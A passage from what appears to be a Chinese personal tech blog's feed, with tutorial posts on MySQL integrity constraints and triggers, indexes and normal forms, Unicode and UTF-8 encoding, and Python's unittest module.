class="built_in">tinyint</span> auto_increment primary <span class="keyword">key</span>,</span><br><span class="line">    <span class="keyword">name</span> <span class="built_in">char</span>(<span class="number">20</span>) <span class="keyword">not</span> <span class="literal">null</span>,</span><br><span class="line">    age <span class="built_in">tinyint</span>,</span><br><span class="line">    <span class="keyword">unique</span> (<span class="keyword">name</span>,age)</span><br><span class="line">);</span><br></pre></td></tr></table></figure></p>
<p>候选键与主键的区别在于：</p>
<ol>
<li>一个表只能创建一个主键，但是可以有多个候选键</li>
<li>定义主键约束时，系统会自动创建<code>primary key</code>索引，定义候选键约束时，系统会自动创建<code>unique</code>索引</li>
</ol>
<h1 id="参照完整性"><a href="#参照完整性" class="headerlink" title="参照完整性"></a>参照完整性</h1><p>现实世界的实体之间往往存在着某种联系，在关系模型中，实体及实体间的联系都是用关系来描述的，那么自然就存在关系与关系间的引用。</p>
<p><strong>参照完整性就是定义外键与主键之间的引用关系</strong>的。参照完整性的定义为：</p>
<blockquote>
<p>若属性（或属性组）F是基本关系R的外键，它与基本关系S的主键K对应，则对于R中的每个元组在F上的值只允许两种可能：要么取空值，要么等于S中某个元组的主键值，其中R与S可以是不同的关系，也可以是同一是关系，而F和K定义在同一个域中。</p>
</blockquote>
<p>声明外键的基本语法如下：<br><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">[constraint [symbol]] foreign key (index_col_name,...) reference_defination</span><br></pre></td></tr></table></figure></p>
<p><code>reference_defination</code>主要用于定义外键所参照的表、列，它的基本语法格式如下：<br><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">references tbl_name [(index_col_name,...)]</span><br><span class="line">[match full | match pratial | match simple]</span><br><span class="line">[on <span class="keyword">delete</span> reference_options]</span><br><span class="line">[<span class="keyword">on</span> <span class="keyword">update</span> reference_options]</span><br></pre></td></tr></table></figure></p>
<p><code>tbl_name</code>指定外键所参照的表名，这个表称为<code>被参照表</code>或<code>父表</code>，外键所在的表被称为<code>参照表</code>或<code>子表</code>。 </p>
<p><code>index_col_name</code>指定被参照表中与外键相关联的列，<strong>必须是父表的主键或候选键</strong>，格式语法如下：<br><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">col_name [(length)] [ASC|DESC]</span><br></pre></td></tr></table></figure></p>
<p><code>reference_options</code>指定参照完整性约束的实现策略，默认为<code>restrict</code>。语法格式如下：<br><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">restrict | cascade | <span class="keyword">set</span> <span class="literal">null</span> | <span class="keyword">no</span> <span class="keyword">action</span></span><br></pre></td></tr></table></figure></p>
<p>cascade：瀑布、级联</p>
<ul>
<li>restrict 限制策略：当要删除或更新被参照表中被参照列上，并在外键中出现的值时，系统拒绝对被参照表的删除和更新</li>
<li>no action 不采取措施策略：一个相关的外键值在被参照表中时，删除或更新被参照表中的键值动作不被允许。类似于restrict</li>
<li>cascade 级联策略：从被参照表中删除或更新纪录行时，自动删除或更新参照表匹配的记录行</li>
<li>set null 制空策略：从被参照表中删除或更新纪录行时，设置参照表中与之对应的外键列的值为null。这个策略需要被参照表中的外键没有声明限定词not null</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> <span class="keyword">users</span> (</span><br><span class="line">    <span class="keyword">id</span> <span class="built_in">tinyint</span> auto_increment primary <span class="keyword">key</span>,</span><br><span class="line">    <span class="keyword">name</span> <span class="built_in">char</span>(<span class="number">20</span>) <span class="keyword">not</span> <span class="literal">null</span>,</span><br><span class="line">    class_id <span class="built_in">tinyint</span> <span class="keyword">not</span> <span class="literal">null</span>,</span><br><span class="line">    <span class="keyword">constraint</span> <span class="keyword">class</span> <span class="keyword">foreign</span> <span class="keyword">key</span> (class_id) <span class="keyword">references</span> <span class="keyword">class</span>(<span class="keyword">id</span>)</span><br><span class="line">    <span class="keyword">on</span> <span class="keyword">delete</span> <span class="keyword">cascade</span></span><br><span class="line">    <span class="keyword">on</span> <span class="keyword">update</span> <span class="keyword">cascade</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure>
<p><strong>当父子表是同一张表时，MySQL不允许指定<code>on update cascade</code>与<code>on update set null</code></strong>，相关联的两个字段类型必须一致。</p>
<h1 id="用户定义完整性"><a href="#用户定义完整性" class="headerlink" title="用户定义完整性"></a>用户定义完整性</h1><p>用户定义完整性是针对某一应用环境的完整性约束条件，它反映了某一具体应用所涉及的数据应满足的要求，关系模型提供定义和检查这类完整性规则的机制。</p>
<p>MySQL提供了<strong>非空约束</strong>，<strong>check约束</strong>和<strong>触发器</strong>3种用户自定义完整性约束。</p>
<h2 id="非空约束"><a href="#非空约束" class="headerlink" title="非空约束"></a>非空约束</h2><p>通过<code>create table</code>或<code>alter table</code>语句将某个列加上关键字<code>not null</code>可以实现非空约束。<br><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> <span class="keyword">users</span> <span class="keyword">modify</span> age <span class="built_in">tinyint</span> <span class="keyword">not</span> <span class="literal">null</span>;</span><br></pre></td></tr></table></figure></p>
<h2 id="check约束"><a href="#check约束" class="headerlink" title="check约束"></a>check约束</h2><p>可以对列或表使用<code>check</code>约束，语法如下：<br><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">check</span> (expr)</span><br></pre></td></tr></table></figure></p>
<p><code>expr</code>是一个SQL表达式，用于指定需要检查的限定条件。更新数据时MySQL会检查更新后的数据行是否满足<code>check</code>约束中的限定条件。该条件可以是表达式，也可以是子查询。</p>
<h3 id="对列使用check约束"><a href="#对列使用check约束" class="headerlink" title="对列使用check约束"></a>对列使用check约束</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> <span class="keyword">users</span> (</span><br><span class="line">    <span class="keyword">id</span> <span class="built_in">tinyint</span> auto_increment primary <span class="keyword">key</span>,</span><br><span class="line">    <span class="keyword">name</span> <span class="built_in">char</span>(<span class="number">20</span>) <span class="keyword">not</span> <span class="literal">null</span>,</span><br><span class="line">    age <span class="built_in">tinyint</span> <span class="keyword">check</span>(age&gt;<span class="number">6</span> <span class="keyword">and</span> age&lt;<span class="number">19</span>)</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
<h3 id="对表使用check约束"><a href="#对表使用check约束" class="headerlink" title="对表使用check约束"></a>对表使用check约束</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> <span class="keyword">users</span>(</span><br><span class="line">    <span class="keyword">id</span> <span class="built_in">tinyint</span> auto_increment primary <span class="keyword">key</span>,</span><br><span class="line">    <span class="keyword">name</span> <span class="built_in">char</span>(<span class="number">20</span>) <span class="keyword">not</span> <span class="literal">null</span>,</span><br><span class="line">    age <span class="built_in">tinyint</span>,</span><br><span class="line">    <span class="keyword">check</span>(<span class="keyword">name</span> <span class="keyword">in</span> (<span class="keyword">select</span> <span class="keyword">name</span> <span class="keyword">from</span> students))</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
<h2 id="触发器约束"><a href="#触发器约束" class="headerlink" title="触发器约束"></a>触发器约束</h2><p>触发器由MySQL的基本命令事件来触发的某种特定操作，这些基本的命令有<code>insert</code>、<code>update</code>、<code>delete</code>等事件来触发某些特定的操作。满足触发器的触发条件时，数据库系统会自动执行触发器中定义的程序语句。</p>
<h3 id="创建单行触发器"><a href="#创建单行触发器" class="headerlink" title="创建单行触发器"></a>创建单行触发器</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">trigger</span> 触发器名 <span class="keyword">before</span>|<span class="keyword">after</span> 触发事件</span><br><span class="line"><span class="keyword">on</span> 表名 <span class="keyword">for</span> <span class="keyword">each</span> <span class="keyword">row</span> 执行语句;</span><br></pre></td></tr></table></figure>
<ul>
<li>before|after 指定触发器执行时间是在触发事件之前还是之后</li>
<li>触发事件 <code>insert</code>、<code>delete</code>、<code>update</code>等都是触发事件</li>
<li>执行语句 当满足条件时执行的触发器语句</li>
</ul>
<p>创建一个触发器，自动在用户向users表插入数据行之前向日志插入当前时间：<br><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">trigger</span> userstime <span class="keyword">before</span> <span class="keyword">insert</span></span><br><span class="line"><span class="keyword">on</span> <span class="keyword">users</span> <span class="keyword">for</span> <span class="keyword">each</span> <span class="keyword">row</span> </span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> userslog <span class="keyword">values</span> (<span class="literal">null</span>, <span class="keyword">now</span>());</span><br></pre></td></tr></table></figure></p>
<h3 id="创建多行触发器"><a href="#创建多行触发器" class="headerlink" title="创建多行触发器"></a>创建多行触发器</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">trigger</span> 触发器名称 <span class="keyword">before</span>|<span class="keyword">after</span> 触发事件</span><br><span class="line"><span class="keyword">on</span> 表名 <span class="keyword">for</span> <span class="keyword">each</span> <span class="keyword">row</span> </span><br><span class="line"><span class="keyword">begin</span></span><br><span class="line">执行语句列表</span><br><span class="line"><span class="keyword">end</span>\g</span><br></pre></td></tr></table></figure>
<p>要执行的多条语句放入<code>begin</code>和<code>end</code>中，用<code>;</code>分隔。</p>
<h3 id="查看触发器："><a href="#查看触发器：" class="headerlink" title="查看触发器："></a>查看触发器：</h3><p>查看所有触发器：<br><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">show</span> <span class="keyword">triggers</span>;</span><br></pre></td></tr></table></figure></p>
<p>根据名字查看触发器：<br><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> infomation_schema.triggers <span class="keyword">where</span> trigger_name=触发器名;</span><br></pre></td></tr></table></figure></p>
<h3 id="删除触发器"><a href="#删除触发器" class="headerlink" title="删除触发器"></a>删除触发器</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">drop</span> <span class="keyword">trigger</span> 触发器名称;</span><br></pre></td></tr></table></figure>
<h1 id="命名完整性约束"><a href="#命名完整性约束" class="headerlink" title="命名完整性约束"></a>命名完整性约束</h1><p>可以对完整性使用添加，删除和修改等操作。为了删除和修改完整性约束，需要在定义约束的同时对其进行命名。命名完整性约束是在各种完整性约束的定义说明之前加上<code>constraint</code>字句实现的：<br><figure class="highlight"><table><tr><td class="code"><pre><span class="line">constraint &lt;symbol&gt; [primary key | foreign key | check]</span><br></pre></td></tr></table></figure></p>
<p>对users表添加外键约束并命名为class：<br><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> <span class="keyword">users</span> <span class="keyword">add</span> <span class="keyword">constraint</span> <span class="keyword">class</span> <span class="keyword">foreign</span> <span class="keyword">key</span> (class_id)</span><br><span class="line"><span class="keyword">references</span> <span class="keyword">class</span>(<span class="keyword">id</span>)</span><br><span class="line"><span class="keyword">on</span> <span class="keyword">update</span> <span class="keyword">cascade</span></span><br><span class="line"><span class="keyword">on</span> <span class="keyword">delete</span> <span class="keyword">cascade</span>;</span><br></pre></td></tr></table></figure></p>
<h1 id="更新完整性约束"><a href="#更新完整性约束" class="headerlink" title="更新完整性约束"></a>更新完整性约束</h1><p>对各种约束命名后就可以用<code>alter table</code>语句来更新或删除。</p>
<h2 id="删除完整性约束"><a href="#删除完整性约束" class="headerlink" title="删除完整性约束"></a>删除完整性约束</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">drop</span> [<span class="keyword">foreign</span> <span class="keyword">key</span> | <span class="keyword">index</span> | &lt;symbol&gt;] | primary <span class="keyword">key</span>;</span><br></pre></td></tr></table></figure>
<p>在删除主键时，必须在创建一个主键否则不会成功。</p>
<p>删除users表的名为class的外键：<br><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> <span class="keyword">users</span> <span class="keyword">drop</span> <span class="keyword">foreign</span> <span class="keyword">key</span> <span class="keyword">class</span>;</span><br></pre></td></tr></table></figure></p>
]]></content>
      <categories>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title>MySQL之索引与范式</title>
    <url>/2018/05/30/%E3%80%8AMySQL%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A%E3%80%8B%E4%B9%8B%E7%B4%A2%E5%BC%95%E4%B8%8E%E8%A7%86%E5%9B%BE/</url>
    <content><![CDATA[<h1 id="索引"><a href="#索引" class="headerlink" title="索引"></a>索引</h1><p>索引是一种特殊的数据结构，类似于字典里的 key。通过索引查询数据库中的内容时，不需要遍历所有数据而是直接指向数据所在的位置，这样就可以快速查询到想要的内容。</p>
<p>索引是把双刃剑，虽然索引可以提高检索数据的速度，提高整体的性能，但是也会带来一些副作用：  </p>
<ol>
<li>额外的物理空间（单列索引至少占原表5%到15%）</li>
<li>额外的创建和维护时间（create、insert、update、delete等）</li>
</ol>
<p>MySQL 支持很多数据类型，选择合适的数据类型存储数据对性能有很大的影响。通常来说，可以遵循以下一些指导原则：</p>
<ol>
<li>越小的数据类型通常更好：越小的数据类型通常在磁盘、内存和CPU缓存中都需要更少的空间，处理起来更快。</li>
<li>简单的数据类型更好：整型数据比起字符，处理开销更小，因为字符串的比较更复杂。在MySQL中，应该用内置的日期和时间数据类型，而不是用字符串来存储时间；以及用整型数据类型存储IP地址。</li>
<li>尽量避免NULL：应该指定列为NOT NULL，除非你想存储NULL。在MySQL中，含有空值的列很难进行查询优化，因为它们使得索引、索引的统计信息以及比较运算更加复杂。你应该用0、一个特殊的值或者一个空串代替空值。</li>
</ol>
<h2 id="索引分类"><a href="#索引分类" class="headerlink" title="索引分类"></a>索引分类</h2><p>常见的索引包括普通索引、唯一性索引、全文索引、单列索引、多列索引等</p>
<ol>
<li>普通索引：即不应用任何限制条件的索引，该索引可以在任何数据类型中创建。字段本身的约束条件可以判断其值是否为空或唯一。</li>
<li>唯一性索引：使用 <code>unique</code> 参数可以设置唯一索引。创建该索引时索引的值必须唯一。通过唯一索引，用户可以快速定位某条数据。<strong>主键是一种特殊的唯一索引</strong>。</li>
<li>全文索引：<code>fulltext</code> 参数可以设置索引为全文索引。全文索引只能创建在 <code>char</code>、<code>varchar</code>、<code>text</code> 类型字段上。查询数据量较大的字符串型字段时，使用全文索引可以提高查询速度。<strong>只有 MyISAM 支持 <code>fulltext</code> 索引</strong></li>
<li>单列索引：就是只对应一个字段的索引，可以包括以上三种索引方式。</li>
<li>多列索引：在表的多个字段上创建一个索引。该索引指向创建时对应的多个字段。可用通过这几个字段进行查询但是<strong>这几个字段必须包含多列索引的第一个字段，只有这样多列索引才会发挥作用</strong></li>
</ol>
<h2 id="创建索引"><a href="#创建索引" class="headerlink" title="创建索引"></a>创建索引</h2><h3 id="在建立数据表时创建索引"><a href="#在建立数据表时创建索引" class="headerlink" title="在建立数据表时创建索引"></a>在建立数据表时创建索引</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> table_name (</span><br><span class="line">    create_defination</span><br><span class="line">    [<span class="keyword">unique</span> | fulltext] <span class="keyword">index</span></span><br><span class="line">    [别名](属性名<span class="number">1</span>[(长度)[,属性名<span class="number">2</span>(长度)...]] [<span class="keyword">ASC</span>|<span class="keyword">DESC</span>])</span><br><span class="line">)[table_options];</span><br></pre></td></tr></table></figure>
<p>一个简单的例子：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> <span class="keyword">users</span> (</span><br><span class="line">    <span class="keyword">id</span> <span class="built_in">tinyint</span> auto_increment primary <span class="keyword">key</span>,</span><br><span class="line">    <span class="keyword">name</span> <span class="built_in">char</span>(<span class="number">20</span>) <span class="keyword">not</span> <span class="literal">null</span>,</span><br><span class="line">    age <span class="built_in">tinyint</span>,</span><br><span class="line">    sex <span class="built_in">tinyint</span>(<span class="number">1</span>),</span><br><span class="line">    fulltext <span class="keyword">index</span> username(<span class="keyword">name</span>)</span><br><span class="line">)<span class="keyword">engine</span>=MyISAM;</span><br></pre></td></tr></table></figure>
<h3 id="在已建立的数据表中创建索引"><a href="#在已建立的数据表中创建索引" class="headerlink" title="在已建立的数据表中创建索引"></a>在已建立的数据表中创建索引</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> [<span class="keyword">unique</span> | fulltext] <span class="keyword">index</span> index_name </span><br><span class="line"><span class="keyword">on</span> table_name(属性[(长度) [AES|<span class="keyword">DESC</span>]])</span><br></pre></td></tr></table></figure>
<p>一个简单的例子：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">unique</span> <span class="keyword">index</span> username <span class="keyword">on</span> <span class="keyword">users</span>(<span class="keyword">name</span>);</span><br></pre></td></tr></table></figure>
<p>也可以通过修改表结构的方式创建索引，参见《MySQL从入门到精通》之基本语句。</p>
<h1 id="范式-Normal-Form"><a href="#范式-Normal-Form" class="headerlink" title="范式(Normal Form)"></a>范式(Normal Form)</h1><p>关系型数据库的规范化理论为：关系数据库中的每一个关系都要满足一定的规范。根据满足规范的条件不同，可以分为5个等级，一般只要把数据库规范到第三等级就足够了。</p>
<h2 id="第一范式-1NF"><a href="#第一范式-1NF" class="headerlink" title="第一范式(1NF)"></a>第一范式(1NF)</h2><p>第一范式包括下列指导原则：</p>
<ol>
<li>数据组中的每个属性只可以包含一个值</li>
<li>关系中的每个数组必须包含相同数量的值</li>
<li>关系中的每个数组一定不能相同</li>
</ol>
<p>在任何一个关系型数据库中，第一范式是对关系模式的基本要求，不满足第一范式的数据库就不是关系型数据库。  </p>
<p><strong>如果数据表中的每一个列都是不可再分割的基本数据项，即同一列中不能有多个值，那么就称此数据表符合第一范式</strong>，由此可见第一范式具有不可再分割的原子特性。</p>
<h2 id="第二范式-2NF"><a href="#第二范式-2NF" class="headerlink" title="第二范式(2NF)"></a>第二范式(2NF)</h2><p>第二范式是在第一范式的基础上建立起来的，即满足第二范式必须先满足第一范式。<strong>第二范式要求数据库表中的每个实体（即各个记录行）必须可以被唯一地区分</strong>。 为了实现区分各记录行通常需要为表设置一个“区分列”，用以存储各个实体的唯一标识。这个唯一属性列被称为<strong>主关键字或主键。</strong></p>
<h2 id="第三范式-3NF"><a href="#第三范式-3NF" class="headerlink" title="第三范式(3NF)"></a>第三范式(3NF)</h2><p>第三范式是在第二范式的基础上建立起来的。<strong>第三范式要求关系表不存在非关键字列对任意候选关键字列的传递函数依赖</strong>，也就是说，第三范式要求一个关系表中不包含已在其他表中包含的非主关键字信息。<br>所谓传递函数依赖，就是指如果存在关键字段A决定非关键字段B，而非关键字段B决定非关键字段C，则称非关键字段C传递函数依赖与关键字段A。参考下面的例子：  </p>
<blockquote>
<p>(员工编码) ——&gt; (决定) (员工姓名、年龄、部门编码、部门经理)  </p>
</blockquote>
<p>上面这个关系表是符合第二范式的，但是不符合第三范式，因为该关系表内部隐含着如下关系：</p>
<blockquote>
<p>(员工编码) ——&gt; (决定) (部门编码) ——&gt; (决定) (部门经理)  </p>
</blockquote>
<p>上面的关系表纯真非关键字段“部门经理”对关键字段“员工编码”的函数传递依赖，对于上面这种关系，可以把这个关系表改为如下两个关系表：  </p>
<blockquote>
<p>员工信息表：(员工编码，员工姓名，年龄好部门编码)<br>部门信息表：(部门编码和部门经理)  </p>
</blockquote>
]]></content>
      <categories>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title>也谈 Unicode</title>
    <url>/2018/05/23/%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%BC%96%E7%A0%81/</url>
    <content><![CDATA[<h2 id="不同的编码方式"><a href="#不同的编码方式" class="headerlink" title="不同的编码方式"></a>不同的编码方式</h2><p>由于计算机是美国人发明的，所以最早的时候只收录了 127 个字符，包括阿拉伯数字、英文字母大小写和一些常用符号，称为 <code>ASCII</code>。后来计算机越来越普及，127 个字符显然不够。于是各国又制定了自己国家的字符编码。为了避免不同国家之间通信出现乱码的问题，一种统一字符集 <code>Unicode</code> 诞生了。<code>ASCII</code> 用 1 个字节来储存一个字符，而 <code>Unicode</code> 用 4 个字节来储存字符。理论上所有的文字、符号都可以用 Unicode 编码表示。换言之，Unicode 是一种表示所有字符的方式`。</p>
<p>有了 Unicode，就解决了从字符到二进制的表示问题。接下来问题就是计算机内如何编码这套字符集了。</p>
<p>所有 Unicode 字符长度都是 4 字节，理论上计算机只需要每次读取 4 个字节就可以得到一个字符，这就是所谓的 <code>UTF-32 编码</code>。由于常用字符数目不到 65535 个，用 2 个字节就能容纳，那就意味着 4 个字节中有 2 个是经常被浪费掉的。所谓浪费就是犯罪，既然如此，系统可以老老实实每次读取 2 字节，遇到特殊符号时再往后多读 2 字节 就可以了。这就是 Java 默认的 <code>UTF-16 编码</code>。可是问题依然没有完全解决，英语是最常用的语言，前面说过，只需要 1 个字节就可以表示英文字母了，UTF-16 把每个字母也按照 2 字节 的方式编码，这无疑还是浪费了很多存储空间。另一种编码方式 <code>UTF-8 编码</code> 则解决了这个问题。UTF-8 编码通常只占 1 字节，但是会用几位冗余信息告诉系统，当前字符有没有结束，还需要继续往下读下一个字节。UTF-8 编码对英文只会占用 1 字节 的空间，而一些特殊字符如中文，则会智能地多占用一点空间进行存储，这样就大大节约了空间，特别适合用于本地存储和网络传输。在计算机内存中，统一使用 Unicode 字符集，而在网络传输和硬盘保存时，推荐使用 UTF-8 作为编码方式。</p>
<p>占用不同字节数的 UTF-8 编码表示形式：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">0xxxxxxx    // 0-127，ASCII 字符</span><br><span class="line">110xxxxx 10xxxxxx   // 128-2047</span><br><span class="line">1110xxxx 10xxxxxx 10xxxxxx  // 2048-65535</span><br><span class="line">11110xxx 10xxxxxx 10xxxxxx 10xxxxxx // 65536-0x10ffff</span><br></pre></td></tr></table></figure>
<p>通常按 UTF-8 编码的中文字符占 3 字节。这种变长编码导致字符串无法按字节下标直接读取一个字符，但由于其与 ASCII 完全兼容、非常节约存储空间、算法高效等特性，在实际中获得了广泛的应用。以下 3 种字符串常量均表示长度为 6 字节的相同串：</p>
<figure class="highlight golang"><table><tr><td class="code"><pre><span class="line"><span class="string">"世界"</span>  <span class="comment">// 中文字符</span></span><br><span class="line"><span class="string">"\xe4\xb8\x96\xe7\x95\x8c"</span>  <span class="comment">// UTF-8</span></span><br><span class="line"><span class="string">"\u4e16\u754c"</span>  <span class="comment">// Unicode</span></span><br></pre></td></tr></table></figure>
<h2 id="编码与解码"><a href="#编码与解码" class="headerlink" title="编码与解码"></a>编码与解码</h2><p>在 python3中，字符默认按 Unicode 编码，而在进行网络传输和硬盘保存时，常常将 Unicode 字符按 UTF-8 的方式编码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s = <span class="string">'hello world'</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'test'</span>, <span class="string">'w'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(s.encode(<span class="string">'utf-8'</span>))</span><br></pre></td></tr></table></figure>
<p>当我们从网络上获取数据时，常常也是获取到以 UTF-8 形式编码的字节，为了方便我们对数据进行处理，需要解码成普通的 Unicode：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">b = <span class="string">b'\xe4\xb8\xad\xe6\x96\x87'</span></span><br><span class="line">print(b.decode(<span class="string">'utf-8'</span>)) <span class="comment"># 输出：'中文'</span></span><br></pre></td></tr></table></figure>
<p><strong>为了避免乱码，应该始终坚持以 UTF-8 的形式进行字符和字节之间的转换</strong></p>
]]></content>
      <categories>
        <category>计算机系统</category>
      </categories>
      <tags>
        <tag>编码</tag>
      </tags>
  </entry>
  <entry>
    <title>unittest简介</title>
    <url>/2018/05/23/unittest%E5%8D%95%E5%85%83%E6%B5%8B%E8%AF%95/</url>
    <content><![CDATA[<p>有个词叫TDD(Tset Driven Development)，测试驱动开发。一个好的开发人员不仅要懂开发，还要懂得一定的测试技巧。python自带了很多的测试库，比如unittest，coverage….介绍一下unittest的使用。</p>
<h1 id="unittests四个重要的概念"><a href="#unittests四个重要的概念" class="headerlink" title="unittests四个重要的概念"></a>unittests四个重要的概念</h1><p>unittest有四个重要的面向对象概念：</p>
<ol>
<li>test fixture。这个概念主要处理测试环境的搭建和清理。很多时候我们在进行测试的时候需要搭建合适的环境，例如创建目录、创建数据库等，而在测试完毕后这些环境又不再需要了。test fixturn可以帮我们很好的处理这些事情。</li>
<li>test case。 既然要进行测试，测试用例当然是最重要的。每一项测试内容都是一个test case。</li>
<li>test suite。我们当然不希望只能一项项的进行测试，最好是将要测试的项目放在一起。test suite相当于test case的集合，当然test suite也能嵌套在test suite中。</li>
<li>test runner。顾名思义，这个概念负责执行测试并控制结果输出。</li>
</ol>
<h1 id="创建testcase"><a href="#创建testcase" class="headerlink" title="创建testcase"></a>创建testcase</h1><p>unittest提供了TastCase类，要创建一个testcase只需要继承这个父类就好了。</p>
<p>先在<code>mathfunc.py</code>编写三个函数用于测试：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(x, y)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> x + y</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">minus</span><span class="params">(x, y)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> x - y</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">string</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> s</span><br></pre></td></tr></table></figure>
<p>在<code>test_math.py</code>中创建测试用例：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> mathfunc <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> unittest <span class="keyword">import</span> TestCase</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestMath</span><span class="params">(TestCase)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">test_add</span><span class="params">(self)</span>:</span></span><br><span class="line">    <span class="string">"""测试add函数"""</span></span><br><span class="line">        self.assertTrue(<span class="number">1</span>+<span class="number">2</span>, add(<span class="number">1</span>, <span class="number">2</span>))</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">test_minus</span><span class="params">(self)</span>:</span></span><br><span class="line">    <span class="string">"""测试minus函数"""</span></span><br><span class="line">        self.assertEqual(<span class="number">2</span><span class="number">-1</span>, minus(<span class="number">2</span>, <span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">test_string</span><span class="params">(self)</span>:</span></span><br><span class="line">    <span class="string">"""测试string函数"""</span></span><br><span class="line">        self.assertIn(<span class="string">'h'</span> <span class="keyword">in</span> string(<span class="string">'hello'</span>))</span><br></pre></td></tr></table></figure>
<p>这就创建了一个testcase，包含三个测试。<strong>testcase中所有的测试必须以<code>test</code>开头</strong>。<code>self.assert*()</code>是由TestCase提供的测试函数。每一个测试里的文档会在输出测试报告时显示。不用python内置的assert()是因为uniittest在遇到<code>self.assert*()</code>发生错误时会把这个测试标记为failure，然后继续执行其他测试。</p>
<h1 id="创建testsuite"><a href="#创建testsuite" class="headerlink" title="创建testsuite"></a>创建testsuite</h1><p>有了testcase，自然想把它加入到suite中。unittest提供了<code>TestSuite</code>类来表示一个suite。默认情况下，unittest按测试函数的函数名进行排序，然后按这个排序执行测试。如果我们想控制测试执行顺序，就要在向suite添加case时做点文章：<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> mathfunc <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> unittest</span><br><span class="line"></span><br><span class="line">suite = unittest.TestSuite()</span><br><span class="line"><span class="comment"># 传入列表，这样就会按照元素顺序执行测试</span></span><br><span class="line">suite.addTests([TestMath(<span class="string">'test_add'</span>), TestMath(<span class="string">'test_minus'</span>), TestMath(<span class="string">'test_string'</span>)])</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    unittest.main()</span><br></pre></td></tr></table></figure></p>
<p>还可以通过unittest提供的TestLoader类来添加testcase，<strong>TestLoader会返回一个suite</strong>。不过<strong>TestLoader无法保证按照顺序执行测试</strong>。TestLoader类提供了一下常用方法：<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> test_math <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 三种方法都可以</span></span><br><span class="line">suite.addTests(unittest.TestLoader().loadTestsFromName(<span class="string">'test_math.TestMath'</span>))</span><br><span class="line">suite.addTests(unitest.TestLoader().loadTestsFromNanes([<span class="string">'test_math.TestMath'</span>])</span><br><span class="line">suite.addTests(unitest.TestLoader().loadTestsFromTestCase(TestMath))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果test_math在/usr/test/目录下</span></span><br><span class="line">suite.addTests(unittest.TestLoader().discover(<span class="string">r'/usr/test/'</span>))</span><br><span class="line"><span class="comment"># 可用添加单个testcase</span></span><br><span class="line">suite.addTest(TestMath(<span class="string">'test_add'</span>))</span><br></pre></td></tr></table></figure></p>
<ul>
<li>loadTestsFromName(模块名.testcase名)</li>
<li>loadTestsFromTestCase(testcase名)</li>
